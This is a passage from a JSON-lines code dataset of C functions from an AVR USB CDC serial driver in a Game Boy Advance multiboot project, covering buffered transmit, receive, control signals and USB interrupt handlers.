intr_state;\n\t\t\t// have we waited too long?  This happens if the user\n\t\t\t// is not running an application that is listening\n\t\t\tif (UDFNUML == timeout) {\n\t\t\t\ttransmit_previous_timeout = 1;\n\t\t\t\treturn -1;\n\t\t\t}\n\t\t\t// has the USB gone offline?\n\t\t\tif (!usb_configuration) return -1;\n\t\t\t// get ready to try checking again\n\t\t\tintr_state = SREG;\n\t\t\tcli();\n\t\t\tUENUM = CDC_TX_ENDPOINT;\n\t\t}\n\n\t\t// compute how many bytes will fit into the next packet\n\t\twrite_size = CDC_TX_SIZE - UEBCLX;\n\t\tif (write_size > size) write_size = size;\n\t\tsize -= write_size;\n\n\t\t// write the packet\n\t\tswitch (write_size) {\n\t\t\t#if (CDC_TX_SIZE == 64)\n\t\t\tcase 64: UEDATX = *buffer++;\n\t\t\tcase 63: UEDATX = *buffer++;\n\t\t\tcase 62: UEDATX = *buffer++;\n\t\t\tcase 61: UEDATX = *buffer++;\n\t\t\tcase 60: UEDATX = *buffer++;\n\t\t\tcase 59: UEDATX = *buffer++;\n\t\t\tcase 58: UEDATX = *buffer++;\n\t\t\tcase 57: UEDATX = *buffer++;\n\t\t\tcase 56: UEDATX = *buffer++;\n\t\t\tcase 55: UEDATX = *buffer++;\n\t\t\tcase 54: UEDATX = *buffer++;\n\t\t\tcase 53: UEDATX = *buffer++;\n\t\t\tcase 52: UEDATX = *buffer++;\n\t\t\tcase 51: UEDATX = *buffer++;\n\t\t\tcase 50: UEDATX = *buffer++;\n\t\t\tcase 49: UEDATX = *buffer++;\n\t\t\tcase 48: UEDATX = *buffer++;\n\t\t\tcase 47: UEDATX = *buffer++;\n\t\t\tcase 46: UEDATX = *buffer++;\n\t\t\tcase 45: UEDATX = *buffer++;\n\t\t\tcase 44: UEDATX = *buffer++;\n\t\t\tcase 43: UEDATX = *buffer++;\n\t\t\tcase 42: UEDATX = *buffer++;\n\t\t\tcase 41: UEDATX = *buffer++;\n\t\t\tcase 40: UEDATX = *buffer++;\n\t\t\tcase 39: UEDATX = *buffer++;\n\t\t\tcase 38: UEDATX = *buffer++;\n\t\t\tcase 37: UEDATX = *buffer++;\n\t\t\tcase 36: UEDATX = *buffer++;\n\t\t\tcase 35: UEDATX = *buffer++;\n\t\t\tcase 34: UEDATX = *buffer++;\n\t\t\tcase 33: UEDATX = *buffer++;\n\t\t\t#endif\n\t\t\t#if (CDC_TX_SIZE >= 32)\n\t\t\tcase 32: UEDATX = *buffer++;\n\t\t\tcase 31: UEDATX = *buffer++;\n\t\t\tcase 30: UEDATX = *buffer++;\n\t\t\tcase 29: UEDATX = *buffer++;\n\t\t\tcase 28: UEDATX = *buffer++;\n\t\t\tcase 27: UEDATX = *buffer++;\n\t\t\tcase 26: UEDATX = *buffer++;\n\t\t\tcase 25: UEDATX = *buffer++;\n\t\t\tcase 24: UEDATX = *buffer++;\n\t\t\tcase 23: UEDATX = *buffer++;\n\t\t\tcase 22: UEDATX = *buffer++;\n\t\t\tcase 21: UEDATX = *buffer++;\n\t\t\tcase 20: UEDATX = *buffer++;\n\t\t\tcase 19: UEDATX = *buffer++;\n\t\t\tcase 18: UEDATX = *buffer++;\n\t\t\tcase 17: UEDATX = *buffer++;\n\t\t\t#endif\n\t\t\t#if (CDC_TX_SIZE >= 16)\n\t\t\tcase 16: UEDATX = *buffer++;\n\t\t\tcase 15: UEDATX = *buffer++;\n\t\t\tcase 14: UEDATX = *buffer++;\n\t\t\tcase 13: UEDATX = *buffer++;\n\t\t\tcase 12: UEDATX = *buffer++;\n\t\t\tcase 11: UEDATX = *buffer++;\n\t\t\tcase 10: UEDATX = *buffer++;\n\t\t\tcase  9: UEDATX = *buffer++;\n\t\t\t#endif\n\t\t\tcase  8: UEDATX = *buffer++;\n\t\t\tcase  7: UEDATX = *buffer++;\n\t\t\tcase  6: UEDATX = *buffer++;\n\t\t\tcase  5: UEDATX = *buffer++;\n\t\t\tcase  4: UEDATX = *buffer++;\n\t\t\tcase  3: UEDATX = *buffer++;\n\t\t\tcase  2: UEDATX = *buffer++;\n\t\t\tdefault:\n\t\t\tcase  1: UEDATX = *buffer++;\n\t\t\tcase  0: break;\n\t\t}\n\t\t// if this completed a packet, transmit it now!\n\t\tif (!(UEINTX & (1<<RWAL))) UEINTX = 0x3A;\n\t\ttransmit_flush_timer = TRANSMIT_FLUSH_TIMEOUT;\n\t\tSREG = intr_state;\n\t}\n\treturn 0;\n}", "path": "usb_normal\\usb_serial.c", "repo_name": "tangrs/usb-gba-multiboot", "stars": 54, "license": "None", "language": "c", "size": 123}
{"docstring": "// transmit a character.  0 returned on success, -1 on error\n", "func_signal": "int8_t usb_serial_putchar(uint8_t c)", "code": "{\n\tuint8_t timeout, intr_state;\n\n\t// if we're not online (enumerated and configured), error\n\tif (!usb_configuration) return -1;\n\t// interrupts are disabled so these functions can be\n\t// used from the main program or interrupt context,\n\t// even both in the same program!\n\tintr_state = SREG;\n\tcli();\n\tUENUM = CDC_TX_ENDPOINT;\n\t// if we gave up due to timeout before, don't wait again\n\tif (transmit_previous_timeout) {\n\t\tif (!(UEINTX & (1<<RWAL))) {\n\t\t\tSREG = intr_state;\n\t\t\treturn -1;\n\t\t}\n\t\ttransmit_previous_timeout = 0;\n\t}\n\t// wait for the FIFO to be ready to accept data\n\ttimeout = UDFNUML + TRANSMIT_TIMEOUT;\n\twhile (1) {\n\t\t// are we ready to transmit?\n\t\tif (UEINTX & (1<<RWAL)) break;\n\t\tSREG = intr_state;\n\t\t// have we waited too long?  This happens if the user\n\t\t// is not running an application that is listening\n\t\tif (UDFNUML == timeout) {\n\t\t\ttransmit_previous_timeout = 1;\n\t\t\treturn -1;\n\t\t}\n\t\t// has the USB gone offline?\n\t\tif (!usb_configuration) return -1;\n\t\t// get ready to try checking again\n\t\tintr_state = SREG;\n\t\tcli();\n\t\tUENUM = CDC_TX_ENDPOINT;\n\t}\n\t// actually write the byte into the FIFO\n\tUEDATX = c;\n\t// if this completed a packet, transmit it now!\n\tif (!(UEINTX & (1<<RWAL))) UEINTX = 0x3A;\n\ttransmit_flush_timer = TRANSMIT_FLUSH_TIMEOUT;\n\tSREG = intr_state;\n\treturn 0;\n}", "path": "usb_multi\\usb_serial.c", "repo_name": "tangrs/usb-gba-multiboot", "stars": 54, "license": "None", "language": "c", "size": 123}
{"docstring": "// get the next character, or -1 if nothing received\n", "func_signal": "int16_t usb_serial_getchar(void)", "code": "{\n\tuint8_t c, intr_state;\n\n\t// interrupts are disabled so these functions can be\n\t// used from the main program or interrupt context,\n\t// even both in the same program!\n\tintr_state = SREG;\n\tcli();\n\tif (!usb_configuration) {\n\t\tSREG = intr_state;\n\t\treturn -1;\n\t}\n\tUENUM = CDC_RX_ENDPOINT;\n\tretry:\n\tc = UEINTX;\n\tif (!(c & (1<<RWAL))) {\n\t\t// no data in buffer\n\t\tif (c & (1<<RXOUTI)) {\n\t\t\tUEINTX = 0x6B;\n\t\t\tgoto retry;\n\t\t}\n\t\tSREG = intr_state;\n\t\treturn -1;\n\t}\n\t// take one byte out of the buffer\n\tc = UEDATX;\n\t// if buffer completely used, release it\n\tif (!(UEINTX & (1<<RWAL))) UEINTX = 0x6B;\n\tSREG = intr_state;\n\treturn c;\n}", "path": "usb_normal\\usb_serial.c", "repo_name": "tangrs/usb-gba-multiboot", "stars": 54, "license": "None", "language": "c", "size": 123}
{"docstring": "// transmit a buffer.\n//  0 returned on success, -1 on error\n// This function is optimized for speed!  Each call takes approx 6.1 us overhead\n// plus 0.25 us per byte.  12 Mbit/sec USB has 8.67 us per-packet overhead and\n// takes 0.67 us per byte.  If called with 64 byte packet-size blocks, this function\n// can transmit at full USB speed using 43% CPU time.  The maximum theoretical speed\n// is 19 packets per USB frame, or 1216 kbytes/sec.  However, bulk endpoints have the\n// lowest priority, so any other USB devices will likely reduce the speed.  Speed\n// can also be limited by how quickly the PC-based software reads data, as the host\n// controller in the PC will not allocate bandwitdh without a pending read request.\n// (thanks to Victor Suarez for testing and feedback and initial code)\n", "func_signal": "int8_t usb_serial_write(const uint8_t *buffer, uint16_t size)", "code": "{\n\tuint8_t timeout, intr_state, write_size;\n\n\t// if we're not online (enumerated and configured), error\n\tif (!usb_configuration) return -1;\n\t// interrupts are disabled so these functions can be\n\t// used from the main program or interrupt context,\n\t// even both in the same program!\n\tintr_state = SREG;\n\tcli();\n\tUENUM = CDC_TX_ENDPOINT;\n\t// if we gave up due to timeout before, don't wait again\n\tif (transmit_previous_timeout) {\n\t\tif (!(UEINTX & (1<<RWAL))) {\n\t\t\tSREG = intr_state;\n\t\t\treturn -1;\n\t\t}\n\t\ttransmit_previous_timeout = 0;\n\t}\n\t// each iteration of this loop transmits a packet\n\twhile (size) {\n\t\t// wait for the FIFO to be ready to accept data\n\t\ttimeout = UDFNUML + TRANSMIT_TIMEOUT;\n\t\twhile (1) {\n\t\t\t// are we ready to transmit?\n\t\t\tif (UEINTX & (1<<RWAL)) break;\n\t\t\tSREG = intr_state;\n\t\t\t// have we waited too long?  This happens if the user\n\t\t\t// is not running an application that is listening\n\t\t\tif (UDFNUML == timeout) {\n\t\t\t\ttransmit_previous_timeout = 1;\n\t\t\t\treturn -1;\n\t\t\t}\n\t\t\t// has the USB gone offline?\n\t\t\tif (!usb_configuration) return -1;\n\t\t\t// get ready to try checking again\n\t\t\tintr_state = SREG;\n\t\t\tcli();\n\t\t\tUENUM = CDC_TX_ENDPOINT;\n\t\t}\n\n\t\t// compute how many bytes will fit into the next packet\n\t\twrite_size = CDC_TX_SIZE - UEBCLX;\n\t\tif (write_size > size) write_size = size;\n\t\tsize -= write_size;\n\n\t\t// write the packet\n\t\tswitch (write_size) {\n\t\t\t#if (CDC_TX_SIZE == 64)\n\t\t\tcase 64: UEDATX = *buffer++;\n\t\t\tcase 63: UEDATX = *buffer++;\n\t\t\tcase 62: UEDATX = *buffer++;\n\t\t\tcase 61: UEDATX = *buffer++;\n\t\t\tcase 60: UEDATX = *buffer++;\n\t\t\tcase 59: UEDATX = *buffer++;\n\t\t\tcase 58: UEDATX = *buffer++;\n\t\t\tcase 57: UEDATX = *buffer++;\n\t\t\tcase 56: UEDATX = *buffer++;\n\t\t\tcase 55: UEDATX = *buffer++;\n\t\t\tcase 54: UEDATX = *buffer++;\n\t\t\tcase 53: UEDATX = *buffer++;\n\t\t\tcase 52: UEDATX = *buffer++;\n\t\t\tcase 51: UEDATX = *buffer++;\n\t\t\tcase 50: UEDATX = *buffer++;\n\t\t\tcase 49: UEDATX = *buffer++;\n\t\t\tcase 48: UEDATX = *buffer++;\n\t\t\tcase 47: UEDATX = *buffer++;\n\t\t\tcase 46: UEDATX = *buffer++;\n\t\t\tcase 45: UEDATX = *buffer++;\n\t\t\tcase 44: UEDATX = *buffer++;\n\t\t\tcase 43: UEDATX = *buffer++;\n\t\t\tcase 42: UEDATX = *buffer++;\n\t\t\tcase 41: UEDATX = *buffer++;\n\t\t\tcase 40: UEDATX = *buffer++;\n\t\t\tcase 39: UEDATX = *buffer++;\n\t\t\tcase 38: UEDATX = *buffer++;\n\t\t\tcase 37: UEDATX = *buffer++;\n\t\t\tcase 36: UEDATX = *buffer++;\n\t\t\tcase 35: UEDATX = *buffer++;\n\t\t\tcase 34: UEDATX = *buffer++;\n\t\t\tcase 33: UEDATX = *buffer++;\n\t\t\t#endif\n\t\t\t#if (CDC_TX_SIZE >= 32)\n\t\t\tcase 32: UEDATX = *buffer++;\n\t\t\tcase 31: UEDATX = *buffer++;\n\t\t\tcase 30: UEDATX = *buffer++;\n\t\t\tcase 29: UEDATX = *buffer++;\n\t\t\tcase 28: UEDATX = *buffer++;\n\t\t\tcase 27: UEDATX = *buffer++;\n\t\t\tcase 26: UEDATX = *buffer++;\n\t\t\tcase 25: UEDATX = *buffer++;\n\t\t\tcase 24: UEDATX = *buffer++;\n\t\t\tcase 23: UEDATX = *buffer++;\n\t\t\tcase 22: UEDATX = *buffer++;\n\t\t\tcase 21: UEDATX = *buffer++;\n\t\t\tcase 20: UEDATX = *buffer++;\n\t\t\tcase 19: UEDATX = *buffer++;\n\t\t\tcase 18: UEDATX = *buffer++;\n\t\t\tcase 17: UEDATX = *buffer++;\n\t\t\t#endif\n\t\t\t#if (CDC_TX_SIZE >= 16)\n\t\t\tcase 16: UEDATX = *buffer++;\n\t\t\tcase 15: UEDATX = *buffer++;\n\t\t\tcase 14: UEDATX = *buffer++;\n\t\t\tcase 13: UEDATX = *buffer++;\n\t\t\tcase 12: UEDATX = *buffer++;\n\t\t\tcase 11: UEDATX = *buffer++;\n\t\t\tcase 10: UEDATX = *buffer++;\n\t\t\tcase  9: UEDATX = *buffer++;\n\t\t\t#endif\n\t\t\tcase  8: UEDATX = *buffer++;\n\t\t\tcase  7: UEDATX = *buffer++;\n\t\t\tcase  6: UEDATX = *buffer++;\n\t\t\tcase  5: UEDATX = *buffer++;\n\t\t\tcase  4: UEDATX = *buffer++;\n\t\t\tcase  3: UEDATX = *buffer++;\n\t\t\tcase  2: UEDATX = *buffer++;\n\t\t\tdefault:\n\t\t\tcase  1: UEDATX = *buffer++;\n\t\t\tcase  0: break;\n\t\t}\n\t\t// if this completed a packet, transmit it now!\n\t\tif (!(UEINTX & (1<<RWAL))) UEINTX = 0x3A;\n\t\ttransmit_flush_timer = TRANSMIT_FLUSH_TIMEOUT;\n\t\tSREG = intr_state;\n\t}\n\treturn 0;\n}", "path": "usb_multi\\usb_serial.c", "repo_name": "tangrs/usb-gba-multiboot", "stars": 54, "license": "None", "language": "c", "size": 123}
{"docstring": "// USB Endpoint Interrupt - endpoint 0 is handled here.  The\n// other endpoints are manipulated by the user-callable\n// functions, and the start-of-frame interrupt.\n//\n", "func_signal": "ISR(USB_COM_vect)", "code": "{\n        uint8_t intbits;\n\tconst uint8_t *list;\n        const uint8_t *cfg;\n\tuint8_t i, n, len, en;\n\tuint8_t *p;\n\tuint8_t bmRequestType;\n\tuint8_t bRequest;\n\tuint16_t wValue;\n\tuint16_t wIndex;\n\tuint16_t wLength;\n\tuint16_t desc_val;\n\tconst uint8_t *desc_addr;\n\tuint8_t\tdesc_length;\n\n        UENUM = 0;\n        intbits = UEINTX;\n        if (intbits & (1<<RXSTPI)) {\n                bmRequestType = UEDATX;\n                bRequest = UEDATX;\n                wValue = UEDATX;\n                wValue |= (UEDATX << 8);\n                wIndex = UEDATX;\n                wIndex |= (UEDATX << 8);\n                wLength = UEDATX;\n                wLength |= (UEDATX << 8);\n                UEINTX = ~((1<<RXSTPI) | (1<<RXOUTI) | (1<<TXINI));\n                if (bRequest == GET_DESCRIPTOR) {\n\t\t\tlist = (const uint8_t *)descriptor_list;\n\t\t\tfor (i=0; ; i++) {\n\t\t\t\tif (i >= NUM_DESC_LIST) {\n\t\t\t\t\tUECONX = (1<<STALLRQ)|(1<<EPEN);  //stall\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t\tdesc_val = pgm_read_word(list);\n\t\t\t\tif (desc_val != wValue) {\n\t\t\t\t\tlist += sizeof(struct descriptor_list_struct);\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\tlist += 2;\n\t\t\t\tdesc_val = pgm_read_word(list);\n\t\t\t\tif (desc_val != wIndex) {\n\t\t\t\t\tlist += sizeof(struct descriptor_list_struct)-2;\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\tlist += 2;\n\t\t\t\tdesc_addr = (const uint8_t *)pgm_read_word(list);\n\t\t\t\tlist += 2;\n\t\t\t\tdesc_length = pgm_read_byte(list);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tlen = (wLength < 256) ? wLength : 255;\n\t\t\tif (len > desc_length) len = desc_length;\n\t\t\tdo {\n\t\t\t\t// wait for host ready for IN packet\n\t\t\t\tdo {\n\t\t\t\t\ti = UEINTX;\n\t\t\t\t} while (!(i & ((1<<TXINI)|(1<<RXOUTI))));\n\t\t\t\tif (i & (1<<RXOUTI)) return;\t// abort\n\t\t\t\t// send IN packet\n\t\t\t\tn = len < ENDPOINT0_SIZE ? len : ENDPOINT0_SIZE;\n\t\t\t\tfor (i = n; i; i--) {\n\t\t\t\t\tUEDATX = pgm_read_byte(desc_addr++);\n\t\t\t\t}\n\t\t\t\tlen -= n;\n\t\t\t\tusb_send_in();\n\t\t\t} while (len || n == ENDPOINT0_SIZE);\n\t\t\treturn;\n                }\n\t\tif (bRequest == SET_ADDRESS) {\n\t\t\tusb_send_in();\n\t\t\tusb_wait_in_ready();\n\t\t\tUDADDR = wValue | (1<<ADDEN);\n\t\t\treturn;\n\t\t}\n\t\tif (bRequest == SET_CONFIGURATION && bmRequestType == 0) {\n\t\t\tusb_configuration = wValue;\n\t\t\tcdc_line_rtsdtr = 0;\n\t\t\ttransmit_flush_timer = 0;\n\t\t\tusb_send_in();\n\t\t\tcfg = endpoint_config_table;\n\t\t\tfor (i=1; i<5; i++) {\n\t\t\t\tUENUM = i;\n\t\t\t\ten = pgm_read_byte(cfg++);\n\t\t\t\tUECONX = en;\n\t\t\t\tif (en) {\n\t\t\t\t\tUECFG0X = pgm_read_byte(cfg++);\n\t\t\t\t\tUECFG1X = pgm_read_byte(cfg++);\n\t\t\t\t}\n\t\t\t}\n        \t\tUERST = 0x1E;\n        \t\tUERST = 0;\n\t\t\treturn;\n\t\t}\n\t\tif (bRequest == GET_CONFIGURATION && bmRequestType == 0x80) {\n\t\t\tusb_wait_in_ready();\n\t\t\tUEDATX = usb_configuration;\n\t\t\tusb_send_in();\n\t\t\treturn;\n\t\t}\n\t\tif (bRequest == CDC_GET_LINE_CODING && bmRequestType == 0xA1) {\n\t\t\tusb_wait_in_ready();\n\t\t\tp = cdc_line_coding;\n\t\t\tfor (i=0; i<7; i++) {\n\t\t\t\tUEDATX = *p++;\n\t\t\t}\n\t\t\tusb_send_in();\n\t\t\treturn;\n\t\t}\n\t\tif (bRequest == CDC_SET_LINE_CODING && bmRequestType == 0x21) {\n\t\t\tusb_wait_receive_out();\n\t\t\tp = cdc_line_coding;\n\t\t\tfor (i=0; i<7; i++) {\n\t\t\t\t*p++ = UEDATX;\n\t\t\t}\n\t\t\tusb_ack_out();\n\t\t\tusb_send_in();\n\t\t\treturn;\n\t\t}\n\t\tif (bRequest == CDC_SET_CONTROL_LINE_STATE && bmRequestType == 0x21) {\n\t\t\tcdc_line_rtsdtr = wValue;\n\t\t\tusb_wait_in_ready();\n\t\t\tusb_send_in();\n\t\t\treturn;\n\t\t}\n\t\tif (bRequest == GET_STATUS) {\n\t\t\tusb_wait_in_ready();\n\t\t\ti = 0;\n\t\t\t#ifdef SUPPORT_ENDPOINT_HALT\n\t\t\tif (bmRequestType == 0x82) {\n\t\t\t\tUENUM = wIndex;\n\t\t\t\tif (UECONX & (1<<STALLRQ)) i = 1;\n\t\t\t\tUENUM = 0;\n\t\t\t}\n\t\t\t#endif\n\t\t\tUEDATX = i;\n\t\t\tUEDATX = 0;\n\t\t\tusb_send_in();\n\t\t\treturn;\n\t\t}\n\t\t#ifdef SUPPORT_ENDPOINT_HALT\n\t\tif ((bRequest == CLEAR_FEATURE || bRequest == SET_FEATURE)\n\t\t  && bmRequestType == 0x02 && wValue == 0) {\n\t\t\ti = wIndex & 0x7F;\n\t\t\tif (i >= 1 && i <= MAX_ENDPOINT) {\n\t\t\t\tusb_send_in();\n\t\t\t\tUENUM = i;\n\t\t\t\tif (bRequest == SET_FEATURE) {\n\t\t\t\t\tUECONX = (1<<STALLRQ)|(1<<EPEN);\n\t\t\t\t} else {\n\t\t\t\t\tUECONX = (1<<STALLRQC)|(1<<RSTDT)|(1<<EPEN);\n\t\t\t\t\tUERST = (1 << i);\n\t\t\t\t\tUERST = 0;\n\t\t\t\t}\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t\t#endif\n        }\n\tUECONX = (1<<STALLRQ) | (1<<EPEN);\t// stall\n}", "path": "usb_multi\\usb_serial.c", "repo_name": "tangrs/usb-gba-multiboot", "stars": 54, "license": "None", "language": "c", "size": 123}
{"docstring": "// number of bytes available in the receive buffer\n", "func_signal": "uint8_t usb_serial_available(void)", "code": "{\n\tuint8_t n=0, i, intr_state;\n\n\tintr_state = SREG;\n\tcli();\n\tif (usb_configuration) {\n\t\tUENUM = CDC_RX_ENDPOINT;\n\t\tn = UEBCLX;\n\t\tif (!n) {\n\t\t\ti = UEINTX;\n\t\t\tif (i & (1<<RXOUTI) && !(i & (1<<RWAL))) UEINTX = 0x6B;\n\t\t}\n\t}\n\tSREG = intr_state;\n\treturn n;\n}", "path": "usb_normal\\usb_serial.c", "repo_name": "tangrs/usb-gba-multiboot", "stars": 54, "license": "None", "language": "c", "size": 123}
{"docstring": "// USB Device Interrupt - handle all device-level events\n// the transmit buffer flushing is triggered by the start of frame\n//\n", "func_signal": "ISR(USB_GEN_vect)", "code": "{\n\tuint8_t intbits, t;\n\n        intbits = UDINT;\n        UDINT = 0;\n        if (intbits & (1<<EORSTI)) {\n\t\tUENUM = 0;\n\t\tUECONX = 1;\n\t\tUECFG0X = EP_TYPE_CONTROL;\n\t\tUECFG1X = EP_SIZE(ENDPOINT0_SIZE) | EP_SINGLE_BUFFER;\n\t\tUEIENX = (1<<RXSTPE);\n\t\tusb_configuration = 0;\n\t\tcdc_line_rtsdtr = 0;\n        }\n\tif (intbits & (1<<SOFI)) {\n\t\tif (usb_configuration) {\n\t\t\tt = transmit_flush_timer;\n\t\t\tif (t) {\n\t\t\t\ttransmit_flush_timer = --t;\n\t\t\t\tif (!t) {\n\t\t\t\t\tUENUM = CDC_TX_ENDPOINT;\n\t\t\t\t\tUEINTX = 0x3A;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}", "path": "usb_normal\\usb_serial.c", "repo_name": "tangrs/usb-gba-multiboot", "stars": 54, "license": "None", "language": "c", "size": 123}
{"docstring": "// transmit a character, but do not wait if the buffer is full,\n//   0 returned on success, -1 on buffer full or error\n", "func_signal": "int8_t usb_serial_putchar_nowait(uint8_t c)", "code": "{\n\tuint8_t intr_state;\n\n\tif (!usb_configuration) return -1;\n\tintr_state = SREG;\n\tcli();\n\tUENUM = CDC_TX_ENDPOINT;\n\tif (!(UEINTX & (1<<RWAL))) {\n\t\t// buffer is full\n\t\tSREG = intr_state;\n\t\treturn -1;\n\t}\n\t// actually write the byte into the FIFO\n\tUEDATX = c;\n\t\t// if this completed a packet, transmit it now!\n\tif (!(UEINTX & (1<<RWAL))) UEINTX = 0x3A;\n\ttransmit_flush_timer = TRANSMIT_FLUSH_TIMEOUT;\n\tSREG = intr_state;\n\treturn 0;\n}", "path": "usb_normal\\usb_serial.c", "repo_name": "tangrs/usb-gba-multiboot", "stars": 54, "license": "None", "language": "c", "size": 123}
{"docstring": "// write the control signals, DCD, DSR, RI, etc\n// There is no CTS signal.  If software on the host has transmitted\n// data to you but you haven't been calling the getchar function,\n// it remains buffered (either here or on the host) and can not be\n// lost because you weren't listening at the right time, like it\n// would in real serial communication.\n", "func_signal": "int8_t usb_serial_set_control(uint8_t signals)", "code": "{\n\tuint8_t intr_state;\n\n\tintr_state = SREG;\n\tcli();\n\tif (!usb_configuration) {\n\t\t// we're not enumerated/configured\n\t\tSREG = intr_state;\n\t\treturn -1;\n\t}\n\n\tUENUM = CDC_ACM_ENDPOINT;\n\tif (!(UEINTX & (1<<RWAL))) {\n\t\t// unable to write\n\t\t// TODO; should this try to abort the previously\n\t\t// buffered message??\n\t\tSREG = intr_state;\n\t\treturn -1;\n\t}\n\tUEDATX = 0xA1;\n\tUEDATX = 0x20;\n\tUEDATX = 0;\n\tUEDATX = 0;\n\tUEDATX = 0; // 0 seems to work nicely.  what if this is 1??\n\tUEDATX = 0;\n\tUEDATX = 1;\n\tUEDATX = 0;\n\tUEDATX = signals;\n\tUEINTX = 0x3A;\n\tSREG = intr_state;\n\treturn 0;\n}", "path": "usb_multi\\usb_serial.c", "repo_name": "tangrs/usb-gba-multiboot", "stars": 54, "license": "None", "language": "c", "size": 123}
{"docstring": "// write the control signals, DCD, DSR, RI, etc\n// There is no CTS signal.  If software on the host has transmitted\n// data to you but you haven't been calling the getchar function,\n// it remains buffered (either here or on the host) and can not be\n// lost because you weren't listening at the right time, like it\n// would in real serial communication.\n", "func_signal": "int8_t usb_serial_set_control(uint8_t signals)", "code": "{\n\tuint8_t intr_state;\n\n\tintr_state = SREG;\n\tcli();\n\tif (!usb_configuration) {\n\t\t// we're not enumerated/configured\n\t\tSREG = intr_state;\n\t\treturn -1;\n\t}\n\n\tUENUM = CDC_ACM_ENDPOINT;\n\tif (!(UEINTX & (1<<RWAL))) {\n\t\t// unable to write\n\t\t// TODO; should this try to abort the previously\n\t\t// buffered message??\n\t\tSREG = intr_state;\n\t\treturn -1;\n\t}\n\tUEDATX = 0xA1;\n\tUEDATX = 0x20;\n\tUEDATX = 0;\n\tUEDATX = 0;\n\tUEDATX = 0; // 0 seems to work nicely.  what if this is 1??\n\tUEDATX = 0;\n\tUEDATX = 1;\n\tUEDATX = 0;\n\tUEDATX = signals;\n\tUEINTX = 0x3A;\n\tSREG = intr_state;\n\treturn 0;\n}", "path": "usb_normal\\usb_serial.c", "repo_name": "tangrs/usb-gba-multiboot", "stars": 54, "license": "None", "language": "c", "size": 123}
{"docstring": "// USB Device Interrupt - handle all device-level events\n// the transmit buffer flushing is triggered by the start of frame\n//\n", "func_signal": "ISR(USB_GEN_vect)", "code": "{\n\tuint8_t intbits, t;\n\n        intbits = UDINT;\n        UDINT = 0;\n        if (intbits & (1<<EORSTI)) {\n\t\tUENUM = 0;\n\t\tUECONX = 1;\n\t\tUECFG0X = EP_TYPE_CONTROL;\n\t\tUECFG1X = EP_SIZE(ENDPOINT0_SIZE) | EP_SINGLE_BUFFER;\n\t\tUEIENX = (1<<RXSTPE);\n\t\tusb_configuration = 0;\n\t\tcdc_line_rtsdtr = 0;\n        }\n\tif (intbits & (1<<SOFI)) {\n\t\tif (usb_configuration) {\n\t\t\tt = transmit_flush_timer;\n\t\t\tif (t) {\n\t\t\t\ttransmit_flush_timer = --t;\n\t\t\t\tif (!t) {\n\t\t\t\t\tUENUM = CDC_TX_ENDPOINT;\n\t\t\t\t\tUEINTX = 0x3A;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n}", "path": "usb_multi\\usb_serial.c", "repo_name": "tangrs/usb-gba-multiboot", "stars": 54, "license": "None", "language": "c", "size": 123}
{"docstring": "// USB Endpoint Interrupt - endpoint 0 is handled here.  The\n// other endpoints are manipulated by the user-callable\n// functions, and the start-of-frame interrupt.\n//\n", "func_signal": "ISR(USB_COM_vect)", "code": "{\n        uint8_t intbits;\n\tconst uint8_t *list;\n        const uint8_t *cfg;\n\tuint8_t i, n, len, en;\n\tuint8_t *p;\n\tuint8_t bmRequestType;\n\tuint8_t bRequest;\n\tuint16_t wValue;\n\tuint16_t wIndex;\n\tuint16_t wLength;\n\tuint16_t desc_val;\n\tconst uint8_t *desc_addr;\n\tuint8_t\tdesc_length;\n\n        UENUM = 0;\n        intbits = UEINTX;\n        if (intbits & (1<<RXSTPI)) {\n                bmRequestType = UEDATX;\n                bRequest = UEDATX;\n                wValue = UEDATX;\n                wValue |= (UEDATX << 8);\n                wIndex = UEDATX;\n                wIndex |= (UEDATX << 8);\n                wLength = UEDATX;\n                wLength |= (UEDATX << 8);\n                UEINTX = ~((1<<RXSTPI) | (1<<RXOUTI) | (1<<TXINI));\n                if (bRequest == GET_DESCRIPTOR) {\n\t\t\tlist = (const uint8_t *)descriptor_list;\n\t\t\tfor (i=0; ; i++) {\n\t\t\t\tif (i >= NUM_DESC_LIST) {\n\t\t\t\t\tUECONX = (1<<STALLRQ)|(1<<EPEN);  //stall\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t\tdesc_val = pgm_read_word(list);\n\t\t\t\tif (desc_val != wValue) {\n\t\t\t\t\tlist += sizeof(struct descriptor_list_struct);\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\tlist += 2;\n\t\t\t\tdesc_val = pgm_read_word(list);\n\t\t\t\tif (desc_val != wIndex) {\n\t\t\t\t\tlist += sizeof(struct descriptor_list_struct)-2;\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\tlist += 2;\n\t\t\t\tdesc_addr = (const uint8_t *)pgm_read_word(list);\n\t\t\t\tlist += 2;\n\t\t\t\tdesc_length = pgm_read_byte(list);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tlen = (wLength < 256) ? wLength : 255;\n\t\t\tif (len > desc_length) len = desc_length;\n\t\t\tdo {\n\t\t\t\t// wait for host ready for IN packet\n\t\t\t\tdo {\n\t\t\t\t\ti = UEINTX;\n\t\t\t\t} while (!(i & ((1<<TXINI)|(1<<RXOUTI))));\n\t\t\t\tif (i & (1<<RXOUTI)) return;\t// abort\n\t\t\t\t// send IN packet\n\t\t\t\tn = len < ENDPOINT0_SIZE ? len : ENDPOINT0_SIZE;\n\t\t\t\tfor (i = n; i; i--) {\n\t\t\t\t\tUEDATX = pgm_read_byte(desc_addr++);\n\t\t\t\t}\n\t\t\t\tlen -= n;\n\t\t\t\tusb_send_in();\n\t\t\t} while (len || n == ENDPOINT0_SIZE);\n\t\t\treturn;\n                }\n\t\tif (bRequest == SET_ADDRESS) {\n\t\t\tusb_send_in();\n\t\t\tusb_wait_in_ready();\n\t\t\tUDADDR = wValue | (1<<ADDEN);\n\t\t\treturn;\n\t\t}\n\t\tif (bRequest == SET_CONFIGURATION && bmRequestType == 0) {\n\t\t\tusb_configuration = wValue;\n\t\t\tcdc_line_rtsdtr = 0;\n\t\t\ttransmit_flush_timer = 0;\n\t\t\tusb_send_in();\n\t\t\tcfg = endpoint_config_table;\n\t\t\tfor (i=1; i<5; i++) 